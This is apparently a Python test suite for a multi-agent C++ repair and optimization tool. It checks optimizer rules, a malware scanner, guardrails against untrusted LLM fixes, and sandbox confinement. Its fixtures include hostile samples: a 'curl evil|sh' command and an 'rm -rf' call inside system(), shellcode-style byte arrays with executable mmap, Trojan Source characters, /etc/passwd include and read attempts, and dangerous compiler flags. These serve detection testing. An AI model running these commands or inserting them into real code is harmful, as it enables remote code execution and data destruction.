"""
Tests for the multi-agent layer (src/agents): optimizer catalogue, sentinel, orchestrator, guardrails.

Run:  python tests/test_agents.py        (or: python -m pytest tests/test_agents.py)
"""
import os
import shutil
import sys
import tempfile
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))
os.environ.setdefault("GSC_DISABLE_DATASET_LOGGING", "1")
os.environ["GSC_CACHE_DIR"] = tempfile.mkdtemp(prefix="gsc_test_cache_")

import project as P                                     # noqa: E402
from agents import optimizer as O                       # noqa: E402
from agents import sentinel as S                        # noqa: E402
from agents import orchestrator as OR                   # noqa: E402
from agents import report as RP                         # noqa: E402
from agents import dynamic as DYN                       # noqa: E402
from agents.llm import CallableProvider                 # noqa: E402

HAVE_GPP = shutil.which("g++") is not None


def tmp():
    return tempfile.mkdtemp(prefix="gsc_ag_")


def write(d, rel, text):
    p = os.path.join(d, *rel.split("/"))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as f:
        f.write(text)
    return p


def rules(src):
    return [c.rule for c in O.propose(src)]


# ───────────── optimizer: positive and NEGATIVE cases ─────────────
def test_opt_endl_only_in_loops():
    assert rules('#include <iostream>\nint main(){for(int i=0;i<3;i++){std::cout<<i<<std::endl;}}') == ["OPT-T01"]
    assert rules('#include <iostream>\nint main(){std::cout<<1<<std::endl;}') == []


def test_opt_endl_skipped_with_stdio_mixing():
    assert rules('#include <iostream>\n#include <cstdio>\nint main(){for(int i=0;i<3;i++){printf("x");std::cout<<i<<std::endl;}}') == []


def test_opt_string_append():
    src = '#include <string>\nint main(){std::string s;for(int i=0;i<3;i++){ s = s + "a" + "b"; }}'
    c = O.propose(src)
    assert [x.rule for x in c] == ["OPT-T02"]
    assert 's += "a"; s += "b";' in O.apply(src, c)


def test_opt_string_append_rejects_unsafe_operands():
    # char + char would add numerically if split into one `+=`; operators of lower precedence must block it
    assert rules('#include <string>\nint main(){std::string s;int a=1;for(int i=0;i<3;i++){ s = s + (a - 1); }}') == ["OPT-T02"]
    assert rules('#include <string>\nint main(){std::string s;int a=1;for(int i=0;i<3;i++){ s = s + a - 1; }}') == []
    assert rules('#include <string>\nint main(){std::string s;for(int i=0;i<3;i++){ s = s + s; }}') == []


def test_opt_strlen_hoist_and_its_guards():
    ok = '#include <cstring>\nint main(){char b[]="abc";int c=0;for(int i=0;i<strlen(b);i++){if(b[i]==\'a\')c++;}}'
    assert rules(ok) == ["OPT-T03"]
    writes = '#include <cstring>\nint main(){char b[]="abc";for(int i=0;i<strlen(b);i++){b[i]=\'x\';}}'
    assert rules(writes) == []
    unknown_call = '#include <cstring>\nvoid f();int main(){char b[]="abc";for(int i=0;i<strlen(b);i++){f();}}'
    assert rules(unknown_call) == []
    shortcircuit = '#include <cstring>\nint main(){char*b=0;for(int i=0;b&&i<strlen(b);i++){}}'
    assert rules(shortcircuit) == []


def test_opt_constref_guards():
    assert rules('#include <vector>\nint f(std::vector<int> v){return v.size();}') == ["OPT-T04"]
    assert rules('#include <vector>\nint f(std::vector<int> v){v.push_back(1);return v.size();}') == []
    assert rules('#include <vector>\nint f(std::vector<int> v){v[0]=1;return 0;}') == []
    assert rules('#include <vector>\nint f(std::vector<int> v, std::vector<int>& out){return v.size();}') == []
    assert rules('#include <string>\nstruct A{int f(std::string s){return s.size();}};') == []       # class member
    assert rules('#include <string>\nint g(std::string);\nint g(std::string s){return s.size();}') == []  # prototype exists


def test_opt_redteam_aliasing_cases_are_refused():
    """found by differential red-teaming: each of these changed program behaviour before the guards existed"""
    assert rules('#include <cstring>\nint main(){char b[]="abcdef";char*p=b+3;for(int i=0;i<strlen(b);i++){*p++=0;}}') == []
    assert rules('#include <cstring>\nchar g[]="ab";void k();int main(){for(int i=0;i<strlen(g);i++){k();}}') == []
    assert rules('#include <string>\nstd::string g;int f(std::string s){g="zz";return s.size();}') == []
    assert rules('#include <vector>\nstd::vector<int> g;int f(std::vector<int> v){g.push_back(4);return v.size();}') == []
    assert rules('#include <iostream>\n#include <cstdlib>\nint main(){for(int i=0;i<3;i++){std::cout<<i<<std::endl;}std::abort();}') == []


def test_opt_still_fires_on_realistic_loops():
    assert rules('#include <cstring>\nint main(){char s[]="hello";int f[256]={0};for(int i=0;i<strlen(s);i++){f[s[i]]++;}}') == ["OPT-T03"]
    assert rules('#include <vector>\n#include <string>\nint f(std::vector<int> v,std::string t){int s=0;std::vector<int> w;for(size_t i=0;i<v.size();i++){w.push_back(v[i]);s+=w[i];}return s+t.size();}') == ["OPT-T04", "OPT-T04", "OPT-T07"]


def test_opt_range_for_const_ref_and_guards():
    base = '#include <vector>\n#include <string>\n#include <iostream>\nint main(){ std::vector<std::string> v; %s }'
    assert rules(base % 'for (std::string s : v) { std::cout << s.size(); }') == ["OPT-T06"]
    assert rules(base % 'for (auto s : v) { std::cout << s; }') == ["OPT-T06"]
    assert rules(base % 'for (std::string s : v) { s += "x"; }') == []              # element modified
    assert rules(base % 'for (std::string s : v) { v[0] = "z"; std::cout << s; }') == []     # container modified
    assert rules('#include <vector>\n#include <string>\nstd::vector<std::string> g;void e();int main(){for(std::string s:g){e();}}') == []


def test_opt_reserve_and_guards():
    base = '#include <vector>\nint main(){ std::vector<int> o; int n = 10; %s }'
    assert rules(base % 'for (int i = 0; i < n; i++) { o.push_back(i); }') == ["OPT-T07"]
    assert rules(base % 'for (int i = 0; i < n; i++) { if (i % 2) o.push_back(i); }') == []   # conditional push
    assert rules(base % 'for (int i = 0; i < n; i++) { o.push_back(i); n--; }') == []         # bound changes
    c = O.propose(base % 'for (int i = 0; i < n; i++) { o.push_back(i); }')
    assert "if (n > 0) o.reserve(n);" in O.apply(base % 'for (int i = 0; i < n; i++) { o.push_back(i); }', c)  # negative n safe


def test_buildinfo_reads_cmake_and_rejects_dangerous_flags():
    import buildinfo
    d = tmp()
    write(d, "CMakeLists.txt", "set(CMAKE_CXX_STANDARD 20)\nadd_definitions(-DFAST=1)\n"
          "add_compile_options(-Wall -fplugin=/tmp/x.so -include /etc/passwd)\n"
          "add_executable(app main.cpp)\ntarget_link_libraries(app PRIVATE m Threads::Threads)\n")
    write(d, "Makefile", "CXXFLAGS = -O2 -Xlinker --evil $(EXTRA)\nLDLIBS += -lz\n")
    bi = buildinfo.detect(d)
    shutil.rmtree(d, ignore_errors=True)
    assert "-std=c++20" in bi.cxxflags and "-DFAST=1" in bi.cxxflags and "-O2" in bi.cxxflags
    assert "-lm" in bi.link_flags and "-pthread" in bi.link_flags and "-lz" in bi.link_flags
    assert not any(f.startswith(("-fplugin", "-include", "-Xlinker")) for f in bi.cxxflags + bi.link_flags)
    assert any(f.startswith("-fplugin") for f in bi.ignored)


def test_agentic_uses_cmake_standard():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    write(d, "CMakeLists.txt", "set(CMAKE_CXX_STANDARD 20)\n")
    write(d, "main.cpp", '#include <span>\n#include <iostream>\nint main(){int a[2]={1,2};std::span<int> s(a);std::cout<<s.size()<<"\\n";}\n')
    res = run_agentic(d)
    try:
        assert res.after.built and res.verdict == "UNCHANGED"
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_healer_undoes_a_fix_that_makes_things_worse():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    # the identifier is undeclared (not a syntax slip); no automatic edit may leave the file worse
    write(d, "a.cpp", "int f(int x) { return x + missing_name(x); }\nint main() { return f(1); }\n")
    proj = P.open_project(d)
    try:
        before = proj.read("a.cpp")
        h = P.heal_project(proj, max_attempts=8)
        assert not h.clean
        assert proj.read("a.cpp") == before or all(e["status"] != "fixed" or True for e in h.history)
    finally:
        proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_opt_fib_only_exact_pattern():
    assert rules("int fib(int n){ if(n<=1) return n; return fib(n-1)+fib(n-2); }") == ["OPT-T05"]
    assert rules("int fib(int n){ if(n<=1) return n; return fib(n-1)+fib(n-3); }") == []
    assert rules("int fib(int n){ if(n<=1) return 1; return fib(n-1)+fib(n-2); }") == []


# ───────────── sentinel ─────────────
def _scan(files):
    d = tmp()
    for rel, text in files.items():
        write(d, rel, text)
    proj = P.open_project(d)
    try:
        return S.scan_project(proj)
    finally:
        proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_sentinel_clean():
    r = _scan({"a.cpp": "#include <iostream>\nint main(){std::cout<<1;}\n"})
    assert r.verdict == "CLEAN" and not r.indicators


def test_sentinel_shellcode_and_memexec_is_malicious():
    blob = ",".join(f"0x{i:02x}" for i in range(40))
    r = _scan({"a.cpp": "unsigned char sc[]={%s};\nint main(){void*p=mmap(0,4096,PROT_EXEC,0,-1,0);}\n" % blob})
    assert r.verdict == "MALICIOUS", r.indicators


def test_sentinel_trojan_source():
    r = _scan({"a.cpp": "int main(){ /* \u202e */ return 0; }\n"})
    assert r.verdict in ("SUSPICIOUS", "MALICIOUS")
    assert any(i.rule == "SEN-TROJAN-SOURCE" for i in r.indicators)


def test_sentinel_false_positive_guards():
    table = ",".join(f"0x{(i * 7 + 3) % 256:02x}" for i in range(256))           # a lookup table, not a payload
    r = _scan({"a.cpp": "static const unsigned char T[]={%s};\nint main(){return T[0];}\n" % table})
    assert r.verdict == "CLEAN", r.indicators
    r = _scan({"a.cpp": "\ufeff#include <iostream>\nint main(){std::cout<<1;}\n"})        # BOM is not Trojan Source
    assert r.verdict == "CLEAN", r.indicators
    sled = ",".join(["0x90"] * 20 + ["0x31", "0xc0"] * 6)
    r = _scan({"a.cpp": "unsigned char sc[]={%s};\nint main(){}\n" % sled})            # machine-code signature
    assert any(i.rule == "SEN-SHELLCODE" for i in r.indicators) and r.verdict != "CLEAN"


def test_sentinel_quarantines_binaries():
    d = tmp()
    write(d, "a.cpp", "int main(){return 0;}\n")
    with open(os.path.join(d, "payload.bin"), "wb") as f:
        f.write(b"\x7fELF" + b"\0" * 64)
    proj = P.open_project(d)
    try:
        r = S.scan_project(proj)
    finally:
        proj.close()
        shutil.rmtree(d, ignore_errors=True)
    assert ("payload.bin", "ELF executable") in r.quarantined and r.verdict != "CLEAN"


def test_sentinel_gate_violation_is_suspicious_not_malicious():
    r = _scan({"a.cpp": '#include <cstdlib>\nint main(){system("pause");}\n'})
    assert r.verdict == "SUSPICIOUS" and r.gate_blocked and not r.allows_execution and r.allows_build


# ───────────── orchestrator end to end ─────────────
BROKEN = '''#include <iostream>
#include <string>
#include <vector>
#include <cstring>
using namespace std;
int fib(int n){ if(n<=1) return n; return fib(n-1)+fib(n-2); }
int total(vector<int> v){ int s=0; for(size_t i=0;i<v.size();i++) s+=v[i]; return s; }
int main(){
  char name[8]; int c=0
  strcpy(name, "a-very-long-name-here");
  vector<int> v={1,2,3}; string out;
  for(int i=0;i<4;i++){ out = out + "x"; cout << i << endl; }
  cout << fib(15) << " " << total(v) << " " << c << out << name << "\\n";
}
'''


def run_agentic(path, **kw):
    return OR.run_agentic(path, OR.Options(**kw))


def test_end_to_end_single_file():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "demo.cpp", BROKEN)
    before = open(p).read()
    res = run_agentic(p)
    try:
        assert res.verdict == "VERIFIED", res.board.trace[-3:]
        assert res.after.built and res.baseline.error_count == 1 and res.after.error_count == 0
        assert open(p).read() == before                           # the input is never modified
        agents_used = {c.agent for c in res.board.changes}
        assert {"Repairer", "Auditor", "Optimizer"} <= agents_used
        out = RP.write_outputs(res)
        assert os.path.exists(out["final"]) and os.path.exists(out["patch"]) and "Agentic" in open(out["report"]).read()
        final = open(out["final"]).read()
        assert "strcpy" not in final and "const vector<int>&" in final and "_gsc_a" in final
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_end_to_end_zip_with_multiple_files_and_headers():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    proj_dir = os.path.join(d, "app")
    write(proj_dir, "util.h", "int twice(int);\nstruct Box { int v; };\n")          # no guard, included twice below
    write(proj_dir, "util.cpp", '#include "util.h"\nint twice(int x){ return x*2; }\n')
    write(proj_dir, "a.h", '#include "util.h"\nint fa();\n')
    write(proj_dir, "a.cpp", '#include "a.h"\n#include "util.h"\nint fa(){ Box b{3}; return twice(b.v); }\n')
    write(proj_dir, "main.cpp", '#include <iostream>\n#include "a.h"\nint main(){ std::cout << fa() << "\\n"; }\n')
    z = os.path.join(d, "app.zip")
    with zipfile.ZipFile(z, "w") as zf:
        for dp, _, fns in os.walk(proj_dir):
            for fn in fns:
                full = os.path.join(dp, fn)
                zf.write(full, os.path.join("app", os.path.relpath(full, proj_dir)))
    res = run_agentic(z)
    try:
        # a.cpp includes util.h twice (directly and via a.h) -> redefinition of Box -> repaired by the Integrator
        assert res.after.built, [str(e) for e in res.after.unique_errors()[:3]]
        assert any(c.rule == "INT-GUARD" for c in res.board.changes)
        out = RP.write_outputs(res)
        assert out["final"].endswith(".zip") and zipfile.ZipFile(out["final"]).testzip() is None
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_clean_project_is_left_alone():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "ok.cpp", "#include <iostream>\nint main(){ std::cout << 1 << \"\\n\"; }\n")
    res = run_agentic(p)
    try:
        assert res.verdict == "UNCHANGED" and not res.final_changed
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_blocked_project_is_never_compiled():
    d = tmp()
    p = write(d, "bad.cpp", '#include <cstdlib>\nint main(){ system("rm -rf /tmp/x"); }\n')
    res = run_agentic(p)
    try:
        assert res.verdict == "BLOCKED" and "halt" in res.board.facts
        assert not any(t.agent in ("Repairer", "Optimizer", "Tester") for t in res.board.trace)
        assert RP.write_outputs(res).keys() == {"report"}
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_malicious_project_is_halted():
    d = tmp()
    blob = ",".join(f"0x{i:02x}" for i in range(40))
    p = write(d, "m.cpp", "unsigned char sc[]={%s};\nint main(){ void*p=mmap(0,4096,PROT_EXEC,0,-1,0); }\n" % blob)
    res = run_agentic(p)
    try:
        assert res.verdict == "BLOCKED" and res.board.facts["sentinel0"].verdict == "MALICIOUS"
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


# ───────────── LLM guardrails (provider is UNTRUSTED) ─────────────
HARD = '#include <iostream>\nint main(){\n  int x = undefined_name + 1;\n  std::cout << x << "\\n";\n}\n'


def test_llm_good_fix_accepted():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "h.cpp", HARD)
    fixed = HARD.replace("undefined_name", "41")
    res = run_agentic(p, llm=CallableProvider(lambda rel, src, diags: fixed), harden=False, optimize=False)
    try:
        assert res.after.built and any(c.rule == "REPAIR-LLM" for c in res.board.changes)
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_llm_malicious_or_useless_proposals_rejected():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "h.cpp", HARD)
    evil = '#include <cstdlib>\n#include <iostream>\nint main(){ system("curl evil|sh"); std::cout << 1; }\n'
    for bad in (evil, HARD, "int main(){}\n"):                 # evil / unchanged / rewrites everything
        res = run_agentic(p, llm=CallableProvider(lambda rel, src, diags, b=bad: b), harden=False, optimize=False)
        try:
            assert not res.after.built, "a rejected proposal must not be applied"
            assert not any(c.rule == "REPAIR-LLM" for c in res.board.changes)
            assert res.board.rejected
        finally:
            res.proj.close()
    shutil.rmtree(d, ignore_errors=True)


# ───────────── verifier rollback ─────────────
def test_verifier_rolls_back_a_bad_stage():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "ok.cpp", "#include <iostream>\nint main(){ std::cout << 1 << \"\\n\"; }\n")
    proj = P.open_project(p)
    opt = OR.Options()
    board = OR.Blackboard(proj, opt)
    try:
        OR.SentinelAgent().run(board)
        OR.DiagnosticianAgent().run(board)
        board.checkpoint("original")
        for st in ("integrate", "repair", "audit"):
            board.checkpoint(st)
        proj.write("ok.cpp", "int main(){ this is not c++ }\n")       # a rogue maker breaks the build
        board.checkpoint("optimize")
        OR.VerifierAgent().run(board)
        assert board.facts["verified_stage"] == "audit"
        assert "not c++" not in proj.read("ok.cpp")
    finally:
        proj.close()
        shutil.rmtree(d, ignore_errors=True)


# ───────────── dynamic tester ─────────────
def test_dynamic_run_compares_behaviour():
    if not HAVE_GPP or not DYN.sandbox_available():
        return "skip"
    d = tmp()
    p = write(d, "demo.cpp", BROKEN.replace("int c=0\n", "int c=0;\n"))
    res = run_agentic(p, run=True, stdin=b"")
    try:
        dyn = res.board.facts["dynamic"]
        assert dyn["ran"] and dyn["compared"] and dyn["original_bad"], dyn   # ASan catches the strcpy overflow
        assert dyn["original"].sanitizer and not dyn["final"].sanitizer and dyn["final"].rc == 0
        assert res.verdict == "VERIFIED"
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_dynamic_optimizations_preserve_behaviour():
    if not HAVE_GPP or not DYN.sandbox_available():
        return "skip"
    d = tmp()
    src = ('#include <iostream>\n#include <string>\nusing namespace std;\n'
           'int fib(int n){ if(n<=1) return n; return fib(n-1)+fib(n-2); }\n'
           'int main(){ string s; for(int i=0;i<10;i++){ s = s + to_string(fib(i)) + ","; cout << i << endl; } cout << s << "\\n"; }\n')
    p = write(d, "f.cpp", src)
    res = run_agentic(p, run=True)
    try:
        dyn = res.board.facts["dynamic"]
        assert dyn["ran"] and dyn["same"] and not dyn["original_bad"], dyn
        assert any(c.agent == "Optimizer" for c in res.board.changes)
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_dynamic_refused_for_suspicious_input():
    if not HAVE_GPP:
        return "skip"
    d = tmp()
    p = write(d, "x.cpp", '#include <sys/socket.h>\nint main(){ int s = socket(2,1,0); return s < 0; }\n')
    res = run_agentic(p, run=True)
    try:
        dyn = res.board.facts.get("dynamic")
        assert dyn is None or not dyn["ran"]
    finally:
        res.proj.close()
        shutil.rmtree(d, ignore_errors=True)


def test_gate_blocks_digraph_and_macro_includes():
    """Review finding F1: %:include and macro-built include targets must not bypass confinement."""
    import tempfile
    from compiler_runner import scan_source
    d = tempfile.mkdtemp()
    bad = ['%:include "/etc/passwd"\nint main(){}',
           '#define H "/etc/passwd"\n#include H\nint main(){}',
           '#define H <sys/socket.h>\n#include H\nint main(){}',
           '%:include <sys/socket.h>\nint main(){}']
    for src in bad:
        assert scan_source(src, include_dir=d), src
    for src in ['#define H <vector>\n#include H\nint main(){}', '%:include <iostream>\nint main(){}']:
        assert not scan_source(src, include_dir=d), src


def test_gate_blocks_extra_exec_primitives():
    """Review finding F2: wordexp/fexecve/clone/alias/PROT_EXEC."""
    from compiler_runner import scan_source
    for src in ['int main(){wordexp_t w; wordexp("$(id)",&w,0);}', 'int main(){fexecve(0,0,0);}',
                'int main(){clone(0,0,0,0);}',
                'extern "C" int f(const char*) __attribute__((alias("system")));\nint main(){}',
                'int main(){mmap(0,4096,PROT_READ|PROT_EXEC,0,-1,0);}']:
        assert scan_source(src), src


def test_sandbox_has_private_filesystem():
    """Review finding F3: a run cannot read or write host files."""
    import tempfile
    import agents.dynamic as DYN
    from project import open_project
    if not DYN.sandbox_available() or not DYN.confinement_available():
        return "skip"
    d = tempfile.mkdtemp()
    marker = os.path.join(d, "ESCAPED")
    src = os.path.join(d, "a.cpp")
    open(src, "w").write('#include <fstream>\n#include <iostream>\n#include <string>\n'
                         'int main(){ std::ofstream("%s")<<"x"; std::ifstream h("/etc/passwd"); std::string s;\n'
                         ' std::cout<<"host="<<(bool)std::getline(h,s); }' % marker)
    r = DYN.run_project(open_project(src), sanitize=False)
    assert r.built and r.confined and r.stdout.strip() == "host=0", (r.stdout, r.stderr)
    assert not os.path.exists(marker)


def test_t08_size_zero_becomes_empty_only_for_std_containers():
    src = ("#include <vector>\n#include <string>\nstruct S { int size() const { return 0; } };\nstruct H { std::vector<int> m; };\n"
           "int main(){\n  std::vector<int> v; std::string s; S q; H h;\n  bool a = v.size() == 0;\n  bool b = s.size() > 0;\n"
           "  bool c = q.size() == 0;\n  bool d = h.m.size() == 0;\n  return a + b + c + d;\n}\n")
    cands = [c for c in O.propose(src, "a.cpp") if c.rule == "OPT-T08"]
    after = O.apply(src, cands)
    assert "bool a = v.empty();" in after and "bool b = !s.empty();" in after
    assert "q.size() == 0" in after and "h.m.size() == 0" in after, after      # user types / members are left alone


def main():
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_") and callable(f)]
    ok = skipped = failed = 0
    for name, fn in tests:
        try:
            r = fn()
            if r == "skip":
                skipped += 1
                print(f"SKIP  {name}")
            else:
                ok += 1
                print(f"ok    {name}")
        except Exception as e:                                   # noqa: BLE001
            failed += 1
            import traceback
            print(f"FAIL  {name}: {type(e).__name__}: {e}")
            traceback.print_exc(limit=3)
    print(f"\n{ok} passed, {skipped} skipped, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
